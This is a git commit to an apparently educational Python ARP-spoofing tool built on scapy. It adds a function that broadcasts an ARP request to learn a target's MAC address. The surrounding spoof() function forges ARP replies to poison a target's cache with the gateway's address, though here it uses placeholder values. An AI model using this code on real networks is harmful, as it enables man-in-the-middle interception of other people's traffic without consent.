3b507b52e6278f89fe61fdca9bc936ba940f0741
Ahmed Khaled <ahmedkhaledabab@gmail.com>
2020-01-31 00:35:38 +0200

    added a function to get the mac_address of the target

--- arp-spoofer/arp_spoofer.py
+++ arp-spoofer/arp_spoofer.py
@@ -6,10 +6,23 @@ Created on Tue Jan 28 02:14:38 2020
 
 import scapy.all as scapy
 
-
+def scan(ip):
+    # the next two lines creates a packet that asks for a specific ip
+    arp_req_packet = scapy.ARP()
+    arp_req_packet.pdst=ip
+    # creating the broadcast MAC address packet
+    broadcast_packet = scapy.Ether()
+    broadcast_packet.dst = "ff:ff:ff:ff:ff:ff"
+    # combining packets
+    bc_arpreq_packet = broadcast_packet/arp_req_packet
+    # sending and receiving packets, the answered ones and the unanswered. The timeout is necessary.  
+    ans_list = scapy.srp(bc_arpreq_packet, timeout=1)[0]
+    
+    return ans_list[0][1].hwsrc
 
 
 def spoof(target_ip, spoo_ip):
     # you can get the pdst and hwdst fields from the network scanner, psrc must be equal to the gateway IP address. 
     packet = scapy.ARP(op=2, pdst="<target_ip>", hwdst="<target_mac>", psrc="<gw_ip>")
     scapy.send(packet)
+    
